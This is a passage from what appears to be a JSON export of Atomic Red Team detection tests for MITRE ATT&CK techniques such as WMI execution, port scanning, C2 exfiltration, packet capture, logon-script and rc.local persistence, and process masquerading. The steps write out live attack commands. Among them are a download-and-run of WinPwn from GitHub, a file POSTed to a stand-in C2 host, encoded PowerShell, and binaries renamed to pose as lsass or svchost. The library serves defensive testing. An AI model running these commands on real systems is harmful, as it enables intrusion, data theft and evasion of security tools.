once decoded, would resemble:\n  Invoke-WMIMethod win32_process -name create -argumentlist \u2018rundll32 c:\\windows\\idmu\\common\\ypprop.dll _XInitImageFuncPtrs\u2019 -ComputerName WORKSTATION\nThe EncodedCommand in this atomic is the following: Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe\nYou should expect to see notepad.exe running after execution of this test.\n[Solarigate Analysis from Microsoft](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA\n", "successCriteria": null}], "techniqueIds": ["clacwm5p302n829mq2ksc6z1u", "clacwm2mf010c29mqgsc53v91"], "tags": []}, {"data": {"name": "Create a Process using obfuscated Win32_Process", "shortName": "T1047", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test tries to mask process creation by creating a new class that inherits from Win32_Process. Indirect call of suspicious method such as Win32_Process::Create can break detection logic.\n[Cybereason blog post No Win32_ProcessNeeded](https://www.cybereason.com/blog/wmi-lateral-movement-win32)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | new_class | Derived class name | String | Win32_Atomic | \n | process_to_execute | Name or path of process to execute. | String | notepad.exe | "}, "executionSteps": [{"description": "$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"Win32_Process\"))\n$NewClass = $Class.Derive(\"#{new_class}\")\n$NewClass.Put()\nInvoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute}\n", "successCriteria": null}], "techniqueIds": ["clacwm5p302n829mq2ksc6z1u"], "tags": []}, {"data": {"name": "Application uninstall using WMIC", "shortName": "T1047", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Emulates uninstalling  applications using WMIC.  This method only works if the product was installed with an msi file.  APTs have been seen using this to uninstall security products.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | node | Computer the action is being executed against but defaults to the localhost. | string | 127.0.0.1 | \n | product | Enter the product name being uninstalled.  This will default to TightVNC. | String | Tightvnc | "}, "executionSteps": [{"description": "wmic /node:\"#{node}\" product where \"name like '#{product}%%'\" call uninstall", "successCriteria": null}], "techniqueIds": ["clacwm5p302n829mq2ksc6z1u"], "tags": []}, {"data": {"name": "WinPwn - spoolvulnscan", "shortName": "T1046", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nspoolvulnscan -noninteractive -consoleoutput", "successCriteria": null}], "techniqueIds": ["clacwm6qt03rp29mq8edf92iq"], "tags": []}, {"data": {"name": "WinPwn - MS17-10", "shortName": "T1046", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Search for MS17-10 vulnerable Windows Servers in the domain using powerSQL function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nMS17-10 -noninteractive -consoleoutput", "successCriteria": null}], "techniqueIds": ["clacwm6qt03rp29mq8edf92iq"], "tags": []}, {"data": {"name": "WinPwn - fruit", "shortName": "T1046", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Search for potentially vulnerable web apps (low hanging fruits) using fruit function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nfruit -noninteractive -consoleoutput", "successCriteria": null}], "techniqueIds": ["clacwm6qt03rp29mq8edf92iq"], "tags": []}, {"data": {"name": "WinPwn - bluekeep", "shortName": "T1046", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in testing on a small domain).\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbluekeep -noninteractive -consoleoutput", "successCriteria": null}], "techniqueIds": ["clacwm6qt03rp29mq8edf92iq"], "tags": []}, {"data": {"name": "Port Scan using python", "shortName": "T1046", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Scan ports to check for listening ports with python\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | host_ip | Host to scan. | String | 127.0.0.1 | \n | filename | Location of the project file | Path | PathToAtomicsFolder\\T1046\\src\\T1046.py | "}, "executionSteps": [{"description": "python #{filename} -i #{host_ip}\n", "successCriteria": null}], "techniqueIds": ["clacwm6qt03rp29mq8edf92iq", "clacwm25m00ln29mqb5t4a4oq"], "tags": []}, {"data": {"name": "Port Scan NMap for Windows", "shortName": "T1046", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Scan ports to check for listening ports for the local host 127.0.0.1\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | nmap_url | NMap installer download URL | Url | https://nmap.org/dist/nmap-7.80-setup.exe | \n | host_to_scan | The host to scan with NMap | String | 127.0.0.1 | "}, "executionSteps": [{"description": "nmap #{host_to_scan}", "successCriteria": null}], "techniqueIds": ["clacwm6qt03rp29mq8edf92iq", "clacwm25m00ln29mqb5t4a4oq"], "tags": []}, {"data": {"name": "Port Scan Nmap", "shortName": "T1046", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Scan ports to check for listening ports with Nmap.\n\nUpon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of adresseses on port 80 to determine if listening. Results will be via stdout.\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | host | Host to scan. | String | 192.168.1.1 | \n | port | Ports to scan. | String | 80 | \n | network_range | Network Range to Scan. | String | 192.168.1.0/24 | "}, "executionSteps": [{"description": "sudo nmap -sS #{network_range} -p #{port}\ntelnet #{host} #{port}\nnc -nv #{host} #{port}\n", "successCriteria": null}], "techniqueIds": ["clacwm6qt03rp29mq8edf92iq", "clacwm25m00ln29mqb5t4a4oq"], "tags": []}, {"data": {"name": "Port Scan", "shortName": "T1046", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Scan ports to check for listening ports.\n\nUpon successful execution, sh will perform a network connection against a single host (192.168.1.1) and determine what ports are open in the range of 1-65535. Results will be via stdout.\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | host | Host to scan. | String | 192.168.1.1 | "}, "executionSteps": [{"description": "for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done\n", "successCriteria": null}], "techniqueIds": ["clacwm6qt03rp29mq8edf92iq", "clacwm25m00ln29mqb5t4a4oq"], "tags": []}, {"data": {"name": "C2 Data Exfiltration", "shortName": "T1041", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Exfiltrates a file present on the victim machine to the C2 server.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | destination_url | Destination URL to post encoded data. | String | example.com | \n | filepath | The file which is being exfiltrated to the C2 Server. | Path | $env:TEMP\\LineNumbers.txt | "}, "executionSteps": [{"description": "if(-not (Test-Path #{filepath})){ \n  1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value \"This is line $_.\" }\n}\n[System.Net.ServicePointManager]::Expect100Continue = $false\n$filecontent = Get-Content -Path #{filepath}\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive\n", "successCriteria": null}], "techniqueIds": ["clacwm6ey03e729mq4et7hjgz"], "tags": []}, {"data": {"name": "Windows Internal pktmon set filter", "shortName": "T1040", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Select Desired ports for packet capture \nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "pktmon.exe filter add -p 445\n", "successCriteria": null}], "techniqueIds": ["clacwm5y302wt29mqcjooht9t"], "tags": []}, {"data": {"name": "Windows Internal pktmon capture", "shortName": "T1040", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Will start a packet capture and store log file as t1040.etl.\nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "pktmon.exe start --etw  -f %TEMP%\\t1040.etl\nTIMEOUT /T 5 >nul 2>&1\npktmon.exe stop\n", "successCriteria": null}], "techniqueIds": ["clacwm5y302wt29mqcjooht9t"], "tags": []}, {"data": {"name": "Windows Internal Packet Capture", "shortName": "T1040", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses the built-in Windows packet capture\nAfter execution you should find a file named trace.etl and trace.cab in the temp directory\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "netsh trace start capture=yes tracefile=%temp%\\trace.etl maxsize=10", "successCriteria": null}], "techniqueIds": ["clacwm5y302wt29mqcjooht9t", "clacwm25x00lt29mqa6xeaand"], "tags": []}, {"data": {"name": "Packet Capture Windows Command Prompt", "shortName": "T1040", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Perform a packet capture using the windows command prompt. This will require a host that has Wireshark/Tshark\ninstalled.\n\nUpon successful execution, tshark will execute and capture 5 packets on interface \"Ethernet\".\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | interface | Specify interface to perform PCAP on. | String | Ethernet | \n | wireshark_url | wireshark installer download URL | Url | https://1.eu.dl.wireshark.org/win64/Wireshark-win64-latest.exe | \n | tshark_path | path to tshark.exe | Path | c:\\program files\\wireshark\\tshark.exe | \n | npcap_url | npcap installed download URL | Url | https://nmap.org/npcap/dist/npcap-1.31.exe | \n | npcap_path | path to npcap.sys | Path | C:\\Program Files\\Npcap\\npcap.sys | "}, "executionSteps": [{"description": "\"c:\\Program Files\\Wireshark\\tshark.exe\" -i #{interface} -c 5\n", "successCriteria": null}], "techniqueIds": ["clacwm5y302wt29mqcjooht9t", "clacwm25x00lt29mqa6xeaand"], "tags": []}, {"data": {"name": "Packet Capture macOS", "shortName": "T1040", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Perform a PCAP on macOS. This will require Wireshark/tshark to be installed. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface en0A.\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | interface | Specify interface to perform PCAP on. | String | en0A | "}, "executionSteps": [{"description": "sudo tcpdump -c 5 -nnni #{interface}    \nif [ -x \"$(command -v tshark)\" ]; then sudo tshark -c 5 -i #{interface}; fi;\n", "successCriteria": null}], "techniqueIds": ["clacwm5y302wt29mqcjooht9t", "clacwm25x00lt29mqa6xeaand"], "tags": []}, {"data": {"name": "Packet Capture Linux", "shortName": "T1040", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | interface | Specify interface to perform PCAP on. | String | ens33 | "}, "executionSteps": [{"description": "tcpdump -c 5 -nnni #{interface}\ntshark -c 5 -i #{interface}\n", "successCriteria": null}], "techniqueIds": ["clacwm5y302wt29mqcjooht9t", "clacwm25x00lt29mqa6xeaand"], "tags": []}, {"data": {"name": "Copy a sensitive File over Administive share with Powershell", "shortName": "T1039", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Copy from sensitive File from the c$ of another LAN computer with powershell\nhttps://twitter.com/SBousseaden/status/1211636381086339073\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote | Remote server name | string | 127.0.0.1 | \n | share_file | Remote Path to the file | Path | Windows\\temp\\Easter_Bunny.password | \n | local_file | Local name | string | Easter_egg.password | "}, "executionSteps": [{"description": "copy-item -Path \"\\\\#{remote}\\C$\\#{share_file}\" -Destination \"$Env:TEMP\\#{local_file}\"", "successCriteria": null}], "techniqueIds": ["clacwm6hs03hu29mq7xwq22uf"], "tags": []}, {"data": {"name": "Copy a sensitive File over Administive share with copy", "shortName": "T1039", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Copy from sensitive File from the c$ of another LAN computer with copy cmd\nhttps://twitter.com/SBousseaden/status/1211636381086339073\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote | Remote server name | string | 127.0.0.1 | \n | share_file | Remote Path to the file | Path | Windows\\temp\\Easter_Bunny.password | \n | local_file | Local name | string | Easter_egg.password | "}, "executionSteps": [{"description": "copy \\\\#{remote}\\C$\\#{share_file} %TEMP%\\#{local_file}", "successCriteria": null}], "techniqueIds": ["clacwm6hs03hu29mq7xwq22uf"], "tags": []}, {"data": {"name": "Add file to Local Library StartupItems", "shortName": "T1037.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify or create an file in /Library/StartupItems\n\n[Reference](https://www.alienvault.com/blogs/labs-research/diversity-in-recent-mac-malware)\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "sudo touch /Library/StartupItems/EvilStartup.plist\n", "successCriteria": null}], "techniqueIds": ["clacwm6li03lm29mq8z9h66xm", "clacwm2h000va29mq2w6r4sen"], "tags": []}, {"data": {"name": "rc.local", "shortName": "T1037.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify rc.local\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi\nprintf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.local\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\\\"\" | sudo tee -a /etc/rc.local\nprintf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.local\nsudo chmod +x /etc/rc.local\n", "successCriteria": null}], "techniqueIds": ["clacwm6pw03qm29mq3p0oeeuj"], "tags": []}, {"data": {"name": "rc.common", "shortName": "T1037.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify rc.common\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi\nprintf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.common\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\\\"\" | sudo tee -a /etc/rc.common\nprintf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.common\nsudo chmod +x /etc/rc.common\n", "successCriteria": null}], "techniqueIds": ["clacwm6pw03qm29mq3p0oeeuj", "clacwm2at00px29mqd9gi1d8n"], "tags": []}, {"data": {"name": "Logon Scripts - Mac", "shortName": "T1037.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Mac logon script\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "1. Create the required plist file\n\n    sudo touch /private/var/root/Library/Preferences/com.apple.loginwindow.plist\n\n2. Populate the plist with the location of your shell script\n\n    sudo defaults write com.apple.loginwindow LoginHook /Library/Scripts/AtomicRedTeam.sh\n\n3. Create the required plist file in the target user's Preferences directory\n\n\t  touch /Users/$USER/Library/Preferences/com.apple.loginwindow.plist\n\n4. Populate the plist with the location of your shell script\n\n\t  defaults write com.apple.loginwindow LoginHook /Library/Scripts/AtomicRedTeam.sh\n", "successCriteria": null}], "techniqueIds": ["clacwm61j030929mq0epe14xw", "clacwm22j00jb29mq3c01e72e"], "tags": []}, {"data": {"name": "Logon Scripts", "shortName": "T1037.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adds a registry value to run batch script created in the %temp% directory. Upon execution, there will be a new environment variable in the HKCU\\Environment key\nthat can be viewed in the Registry Editor.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | script_path | Path to .bat file | String | %temp%\\art.bat | \n | script_command | Command To Execute | String | echo Art \"Logon Script\" atomic test was successful. >> %USERPROFILE%\\desktop\\T1037.001-log.txt | "}, "executionSteps": [{"description": "echo \"#{script_command}\" > #{script_path}\nREG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"#{script_path}\" /f\n", "successCriteria": null}], "techniqueIds": ["clacwm6rt03sz29mqfiiu5qqr", "clacwm22m00je29mq37ap4r7a"], "tags": []}, {"data": {"name": "Space After Filename (Manual)", "shortName": "T1036.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Space After Filename\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "1. echo '#!/bin/bash\\necho \"print \\\"hello, world!\\\"\" | /usr/bin/python\\nexit' > execute.txt && chmod +x execute.txt\n\n2. mv execute.txt \"execute.txt \"\n\n3. ./execute.txt\\ \n", "successCriteria": null}], "techniqueIds": ["clacwm6r303s329mq0xzr8o5y"], "tags": []}, {"data": {"name": "Space After Filename", "shortName": "T1036.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Space after filename.\n\n\n**Supported Platforms:** macos, linux\n\n"}, "executionSteps": [{"description": "mkdir -p /tmp/atomic-test-T1036.006\ncd /tmp/atomic-test-T1036.006\nmkdir -p 'testdirwithspaceend '\n/usr/bin/echo -e \"%d\\na\\n#!/usr/bin/perl\\nprint \\\"running T1035.006 with space after filename to masquerade init\\\\n\\\";\\nqx/cp \\/usr\\/bin\\/perl 'init  '/;\\nqx/'.\\/init  ' -e 'sleep 5'/;\\n.\\nwq\\n\" | ed 'testdirwithspaceend /init ' >/dev/null\nchmod +x 'testdirwithspaceend /init '\n'./testdirwithspaceend /init '\n", "successCriteria": null}], "techniqueIds": ["clacwm6r303s329mq0xzr8o5y", "clacwm2ge00us29mq28glh2zt"], "tags": []}, {"data": {"name": "Masquerade as a built-in system executable", "shortName": "T1036.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Launch an executable that attempts to masquerade as a legitimate executable.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | executable_filepath | File path where the generated executable will be dropped and executed from. The filename should be the name of a built-in system utility. | String | $Env:windir\\Temp\\svchost.exe | "}, "executionSteps": [{"description": "Add-Type -TypeDefinition @'\npublic class Test {\n    public static void Main(string[] args) {\n        System.Console.WriteLine(\"tweet, tweet\");\n    }\n}\n'@ -OutputAssembly \"#{executable_filepath}\"\n\nStart-Process -FilePath \"#{executable_filepath}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5tn02sn29mq1w558ptg"], "tags": []}, {"data": {"name": "Execute a process from a directory masquerading as the current parent directory.", "shortName": "T1036.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Create and execute a process from a directory masquerading as the current parent directory (`...` instead of normal `..`)\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | test_message | Test message to echo out to the screen | String | Hello from the Atomic Red Team test T1036.005#1 | "}, "executionSteps": [{"description": "mkdir $HOME/...\ncp $(which sh) $HOME/...\n$HOME/.../sh -c \"echo #{test_message}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5tn02sn29mq1w558ptg"], "tags": []}, {"data": {"name": "Creating W32Time similar named service using schtasks", "shortName": "T1036.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creating W32Time similar named service (win32times) using schtasks just like threat actor dubbed \"Operation Wocao\"\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "schtasks /create /ru system /sc daily /tr \"cmd /c powershell.exe -ep bypass -file c:\\T1036.004_NonExistingScript.ps1\" /tn win32times /f\nschtasks /query /tn win32times\n", "successCriteria": null}], "techniqueIds": ["clacwm6b803a629mq4tj10f9n", "clacwm23p00k529mq9d000ix5"], "tags": []}, {"data": {"name": "Creating W32Time similar named service using sc", "shortName": "T1036.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creating W32Time similar named service (win32times) using sc just like threat actor dubbed \"Operation Wocao\"\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "sc create win32times binPath= \"cmd /c start c:\\T1036.004_NonExistingScript.ps1\"\nsc qc win32times\n", "successCriteria": null}], "techniqueIds": ["clacwm6b803a629mq4tj10f9n", "clacwm23p00k529mq9d000ix5"], "tags": []}, {"data": {"name": "Masquerading as Windows LSASS process", "shortName": "T1036.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Copies cmd.exe, renames it, and launches it to masquerade as an instance of lsass.exe.\n\nUpon execution, cmd will be launched by powershell. If using Invoke-AtomicTest, The test will hang until the 120 second timeout cancels the session\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe\n%SystemRoot%\\Temp\\lsass.exe /B\n", "successCriteria": null}], "techniqueIds": ["clacwm6ku03ku29mqbfsldyom", "clacwm2by00r029mq6hl73qw8"], "tags": []}, {"data": {"name": "Masquerading as Linux crond process.", "shortName": "T1036.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.\n\nUpon successful execution, sh is renamed to `crond` and executed.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "cp /bin/sh /tmp/crond;\necho 'sleep 5' | /tmp/crond\n", "successCriteria": null}], "techniqueIds": ["clacwm6ku03ku29mqbfsldyom", "clacwm2by00r029mq6hl73qw8"], "tags": []}, {"data": {"name": "Masquerading - wscript.exe running as svchost.exe", "shortName": "T1036.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Copies wscript.exe, renames it, and launches it to masquerade as an instance of svchost.exe.\n\nUpon execution, no windows will remain open but wscript will have been renamed to svchost and ran out of the temp folder\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "copy %SystemRoot%\\System32\\wscript.exe %APPDATA%\\svchost.exe /Y\ncmd.exe /c %APPDATA%\\svchost.exe /B\n", "successCriteria": null}], "techniqueIds": ["clacwm6ku03ku29mqbfsldyom", "clacwm2by00r029mq6hl73qw8"], "tags": []}, {"data": {"name": "Masquerading - windows exe running as different windows exe", "shortName": "T1036.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Copies a windows exe, renames it as another windows exe, and launches it to masquerade as second windows exe\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | outputfile | path of file to execute | Path | ($env:TEMP + \"\\svchost.exe\") | \n | inputfile | path of file to copy | Path | $env:ComSpec | "}, "executionSteps": [{"description": "copy #{inputfile} #{outputfile}\n$myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id\nStop-Process -ID $myT1036_003\n", "successCriteria": null}], "techniqueIds": ["clacwm6ku03ku29mqbfsldyom", "clacwm2by00r029mq6hl73qw8"], "tags": []}, {"data": {"name": "Masquerading - powershell.exe running as taskhostw.exe", "shortName": "T1036.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Copies powershell.exe, renames it, and launches it to masquerade as an instance of taskhostw.exe.\n\nUpon successful execution, powershell.exe is renamed as taskhostw.exe and executed from non-standard path.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\taskhostw.exe /Y\ncmd.exe /K %APPDATA%\\taskhostw.exe\n", "successCriteria": null}], "techniqueIds": ["clacwm6ku03ku29mqbfsldyom", "clacwm2by00r029mq6hl73qw8"], "tags": []}, {"data": {"name": "Masquerading - non-windows exe running as windows exe", "shortName": "T1036.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Copies an exe, renames it as a windows exe, and launches it to masquerade as a real windows exe\n\nUpon successful execution, powershell will execute T1036.003.exe as svchost.exe from on a non-standard path.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | outputfile | path of file to execute | Path | ($env:TEMP + \"\\svchost.exe\") | \n | inputfile | path of file to copy | Path | PathToAtomicsFolder\\T1036.003\\bin\\T1036.003.exe | "}, "executionSteps": [{"description": "copy #{inputfile} #{outputfile}\n$myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id\nStop-Process -ID $myT1036_003\n", "successCriteria": null}], "techniqueIds": ["clacwm6ku03ku29mqbfsldyom", "clacwm2by00r029mq6hl73qw8"], "tags": []}, {"data": {"name": "Masquerading - cscript.exe running as notepad.exe", "shortName": "T1036.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Copies cscript.exe, renames it, and launches it to masquerade as an instance of notepad.exe.\n\nUpon successful execution, cscript.exe is renamed as notepad.exe and executed from non-standard path.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "copy %SystemRoot%\\System32\\cscript.exe %APPDATA%\\notepad.exe /Y\ncmd.exe /c %APPDATA%\\notepad.exe /B\n", "successCriteria": null}], "techniqueIds": ["clacwm6ku03ku29mqbfsldyom", "clacwm2by00r029mq6hl73qw8"], "tags": []}, {"data": {"name": "Malicious process Masquerading as LSM.exe", "shortName": "T1036.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Detect LSM running from an incorrect directory and an incorrect service account\nThis works by copying cmd.exe to a file, naming it lsm.exe, then copying a file to the C:\\ folder.\n\nUpon successful execution, cmd.exe will be renamed as lsm.exe and executed from non-standard path.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe\nC:\\lsm.exe /c echo T1036.003 > C:\\T1036.003.txt\n", "successCriteria": null}], "techniqueIds": ["clacwm6ku03ku29mqbfsldyom", "clacwm2by00r029mq6hl73qw8"], "tags": []}, {"data": {"name": "File Extension Masquerading", "shortName": "T1036.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "download and execute a file masquerading as images or Office files. Upon execution 3 calc instances and 3 vbs windows will be launched.\n\ne.g SOME_LEGIT_NAME.[doc,docx,xls,xlsx,pdf,rtf,png,jpg,etc.].[exe,vbs,js,ps1,etc] (Quartelyreport.docx.exe)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | exe_path | path to exe to use when creating masquerading files | Path | C:\\Windows\\System32\\calc.exe | \n | vbs_path | path of vbs to use when creating masquerading files | Path | PathToAtomicsFolder\\T1036.003\\src\\T1036.003_masquerading.vbs | \n | ps1_path | path of powershell script to use when creating masquerading files | Path | PathToAtomicsFolder\\T1036.003\\src\\T1036.003_masquerading.ps1 | "}, "executionSteps": [{"description": "copy #{exe_path} %temp%\\T1036.003_masquerading.docx.exe /Y\ncopy #{exe_path} %temp%\\T1036.003_masquerading.pdf.exe /Y\ncopy #{exe_path} %temp%\\T1036.003_masquerading.ps1.exe /Y\ncopy #{vbs_path} %temp%\\T1036.003_masquerading.xls.vbs /Y\ncopy #{vbs_path} 